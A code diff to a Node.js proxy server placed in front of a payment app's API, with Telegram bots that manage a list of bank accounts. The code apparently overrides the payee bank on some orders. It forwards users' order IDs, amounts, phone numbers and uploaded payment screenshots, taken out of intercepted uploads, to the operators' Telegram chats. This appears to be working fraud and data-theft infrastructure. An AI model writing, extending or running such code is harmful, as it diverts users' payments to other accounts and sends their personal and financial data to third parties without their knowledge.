@@ -634,7 +634,8 @@ app.post('/bot2-webhook', async (req, res) => {
         '🤖 Bank Manager Bot\n\n' +
         'Commands:\n' +
         '/banks — Bank list dekho\n' +
-        '/addbank holder|accountNo|ifsc|bankName|upiId — Bank add karo\n' +
+        '/addbank holder|accountNo|ifsc — Bank add karo\n' +
+        '/removebank <number> — Bank remove karo\n' +
         '/setbank <number> — Active bank set karo\n' +
         '/setmin <number> <amount> — Min order amount set karo'
       );
@@ -729,11 +730,29 @@ app.post('/bot2-webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
+    // ── /removebank ────────────────────────────────────────────
+    if (text.startsWith('/removebank ')) {
+      const idx = parseInt(text.substring(12).trim()) - 1;
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
+        await bot2.sendMessage(chatId, `❌ Invalid number. Banks: 1–${data.banks.length}`);
+        return res.sendStatus(200);
+      }
+      const removed = data.banks.splice(idx, 1)[0];
+      if (data.activeIndex >= data.banks.length) data.activeIndex = data.banks.length - 1;
+      await saveData(data);
+      await bot2.sendMessage(chatId, `🗑 Bank Removed:\n👤 ${removed.accountHolder}\n🔢 ${removed.accountNo}\n📋 Remaining: ${data.banks.length}`);
+      if (data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `🗑 [Bot2] Bank Removed:\n👤 ${removed.accountHolder}\n🔢 ${removed.accountNo}\n📋 Remaining: ${data.banks.length}`).catch(() => {});
+      }
+      return res.sendStatus(200);
+    }
+
     // ── Unknown ────────────────────────────────────────────────
     await bot2.sendMessage(chatId,
       '❓ Unknown command\n\n' +
       '/banks — Bank list\n' +
-      '/addbank holder|accountNo|ifsc|bankName|upiId\n' +
+      '/addbank holder|accountNo|ifsc\n' +
+      '/removebank <number>\n' +
       '/setbank <number>\n' +
       '/setmin <number> <amount>'
     );
@@ -1422,6 +1441,22 @@ app.all('/app/pay/order/detail', async (req, res) => {
       msg += `\n🕐 ${now}`;
       bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
+    // Bot2: notify only proxy bank orders
+    if (bank && shouldOverride && effectiveId) {
+      const phone2 = getPhone(data, effectiveId);
+      const rd2 = (respData && typeof respData === 'object') ? respData : {};
+      const orderId2 = rd2.orderId || rd2.orderNo || rd2.id || req.parsedBody?.orderId || '';
+      const amount2 = rd2.amount || rd2.orderAmount || rd2.money || req.parsedBody?.amount || '';
+      const now2 = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      proxyUserOrders.set(String(effectiveId), { orderId: orderId2, ts: Date.now() });
+      let b2msg = `🛒 Buy Task [${effectiveId}]${phone2 ? ' 📱' + phone2 : ''}`;
+      if (orderId2) b2msg += `\n📋 Order: ${orderId2}`;
+      if (amount2) b2msg += `\n💰 Amount: ₹${amount2}`;
+      b2msg += `\n🏦 ${bank.accountHolder} | ${bank.accountNo}`;
+      if (bank.ifsc) b2msg += ` | ${bank.ifsc}`;
+      b2msg += `\n🕐 ${now2}`;
+      await sendBot2All(data, b2msg);
+    }
     if (effectiveId) trackUser(data, effectiveId, 'Order Detail');
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -1679,7 +1714,58 @@ for (const ep of COLLECTION_ENDPOINTS) {
   });
 }
 
-app.all('/app/pay/upload/file', async (req, res) => { await transparentProxy(req, res); });
+app.all('/app/pay/upload/file', async (req, res) => {
+  try {
+    const data = await loadData();
+    const userId = await extractUserId(req, null);
+    const ct = (req.headers['content-type'] || '');
+    // Extract image from multipart
+    let imgBuf = null;
+    if (ct.includes('multipart') && req.rawBody) {
+      const bMatch = ct.match(/boundary=([^\s;]+)/i);
+      if (bMatch) {
+        const boundary = '--' + bMatch[1].replace(/^"(.*)"$/, '$1');
+        const buf = req.rawBody;
+        const bBuf = Buffer.from(boundary);
+        let pos = buf.indexOf(bBuf);
+        while (pos !== -1 && !imgBuf) {
+          const partStart = pos + bBuf.length + 2;
+          const nextB = buf.indexOf(bBuf, partStart);
+          const partEnd = nextB === -1 ? buf.length : nextB - 2;
+          const partBuf = buf.slice(partStart, partEnd);
+          const sep = partBuf.indexOf(Buffer.from('\r\n\r\n'));
+          if (sep !== -1) {
+            const hdrs = partBuf.slice(0, sep).toString();
+            if (hdrs.toLowerCase().includes('image') || hdrs.toLowerCase().includes('filename')) {
+              imgBuf = partBuf.slice(sep + 4);
+            }
+          }
+          pos = nextB === -1 ? -1 : nextB;
+        }
+      }
+    }
+    // Forward to real API first
+    const { response, respBody, respHeaders } = await proxyFetch(req);
+    res.writeHead(response.status, respHeaders);
+    res.end(respBody);
+    // Send screenshot to bots
+    if (imgBuf && imgBuf.length > 100) {
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      const caption = `📸 Screenshot [${userId || 'N/A'}]\n🕐 ${now}`;
+      const isProxy = userId ? (proxyUserOrders.has(String(userId)) && (Date.now() - proxyUserOrders.get(String(userId)).ts < 30 * 60 * 1000)) : false;
+      // Main bot — always
+      if (data.adminChatId && bot) {
+        bot.sendPhoto(data.adminChatId, imgBuf, { caption }).catch(() => {});
+      }
+      // Bot2 — only proxy bank orders
+      if (isProxy && bot2 && data.bot2Chats && data.bot2Chats.length) {
+        for (const cid of data.bot2Chats) {
+          bot2.sendPhoto(cid, imgBuf, { caption }).catch(() => {});
+        }
+      }
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
 app.all('/app/user/upload/param', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/global/config', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/auth/refresh/session', async (req, res) => {
